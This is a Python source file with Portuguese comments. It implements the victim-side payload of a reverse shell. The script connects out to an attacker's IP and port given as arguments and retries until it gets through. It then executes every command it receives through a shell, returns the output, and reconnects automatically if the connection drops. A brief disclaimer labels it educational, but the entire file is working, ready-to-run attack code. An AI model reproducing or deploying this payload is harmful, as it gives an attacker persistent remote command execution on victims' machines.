#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
client.py (Parte da Vítima)

Descrição:
Este é o "cliente" ou "payload" do shell reverso.
Ele é executado na máquina da vítima e se conecta
de volta à máquina do atacante.

AVISO: Este script é apenas para fins educacionais.
Nunca use em sistemas sem autorização explícita.

Autor: Ana Luísa Valeriano Bomfim
Data: 6 de Junho de 2025
"""

import socket
import subprocess
import os
import sys
import time

def connect_to_server(server_ip, server_port, retry_interval=10):
    """
    Tenta se conectar (ou reconectar) ao servidor do atacante.
    """
    while True:
        try:
            # Cria o socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Tenta se conectar
            client_socket.connect((server_ip, server_port))
            # Se conectar, retorna o socket
            return client_socket
        except socket.error as e:
            # Se falhar, fecha o socket, espera e tenta novamente
            client_socket.close()
            print(f"Erro de conexão ({e}). Tentando novamente em {retry_interval}s...")
            time.sleep(retry_interval)

def execute_command(cmd):
    """
    Executa um comando no sistema operacional e retorna a saída.
    """
    # Trata o comando 'cd' separadamente, pois ele não é um executável
    if cmd.startswith('cd '):
        try:
            # Pega o diretório (ex: 'cd /tmp' -> '/tmp')
            target_dir = cmd.split(' ', 1)[1]
            os.chdir(target_dir)
            # Retorna o novo diretório de trabalho
            return f"Mudou para o diretório: {os.getcwd()}"
        except FileNotFoundError:
            return f"Erro: Diretório não encontrado: {target_dir}"
        except Exception as e:
            return f"Erro ao mudar de diretório: {e}"
            
    # Para todos os outros comandos, usa o subprocess
    try:
        # Popen executa o comando
        # shell=True permite executar comandos complexos (ex: 'ls -la')
        # stdout e stderr capturam a saída padrão e de erro
        process = subprocess.Popen(
            cmd, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            stdin=subprocess.PIPE
        )
        
        # Lê a saída e o erro
        output_bytes, error_bytes = process.communicate()
        
        # Decodifica ambos, ignorando erros
        output = output_bytes.decode('utf-8', 'ignore')
        error = error_bytes.decode('utf-8', 'ignore')
        
        # Retorna a saída padrão OU o erro (se houver)
        if error:
            return error
        else:
            return output
            
    except Exception as e:
        return f"Erro ao executar comando: {e}"

def reverse_shell_loop(server_ip, server_port):
    """
    Loop principal: conecta, recebe comando, executa, envia resultado.
    """
    conn = connect_to_server(server_ip, server_port)
    
    # Envia uma mensagem inicial para o atacante
    conn.sendall(f"Conectado! (Host: {socket.gethostname()})\n".encode('utf-8'))
    
    while True:
        try:
            # Recebe o comando (buffer de 1024 bytes)
            cmd_bytes = conn.recv(1024)
            cmd = cmd_bytes.decode('utf-8', 'ignore').strip()
            
            if not cmd:
                continue
            
            # Comando para fechar a conexão do lado da vítima
            if cmd.lower() == 'exit':
                conn.sendall(b"Conexão encerrada.\n")
                break # Sai do loop
            
            # Executa o comando
            output = execute_command(cmd)
            
            # Envia o resultado de volta
            # Adicionamos um 'end_of_output' para o servidor saber que terminou
            # (Útil para comandos maiores, mas aqui só sinaliza)
            if not output:
                # Envia algo mesmo se o comando não tiver saída (ex: 'touch file')
                conn.sendall(b"(Comando executado sem saida)\n")
            else:
                conn.sendall(output.encode('utf-8'))
                
        except socket.error:
            # Se a conexão cair, tenta reconectar
            print("Conexão perdida. Tentando reconectar...")
            conn.close()
            conn = connect_to_server(server_ip, server_port)
        except Exception as e:
            # Envia erros inesperados de volta ao atacante
            try:
                conn.sendall(f"Erro no cliente: {e}\n".encode('utf-8'))
            except socket.error:
                # Se não puder nem enviar o erro, reconecta
                conn.close()
                conn = connect_to_server(server_ip, server_port)

def main():
    # Os argumentos são passados diretamente (sem argparse)
    # para tornar o payload o mais simples possível.
    if len(sys.argv) != 3:
        print(f"Uso: python {sys.argv[0]} <IP_DO_SERVIDOR> <PORTA_DO_SERVIDOR>")
        sys.exit(1)
        
    server_ip = sys.argv[1]
    
    try:
        server_port = int(sys.argv[2])
    except ValueError:
        print("Erro: A porta deve ser um número.")
        sys.exit(1)
        
    # Inicia o loop principal
    reverse_shell_loop(server_ip, server_port)

if __name__ == "__main__":
    main()
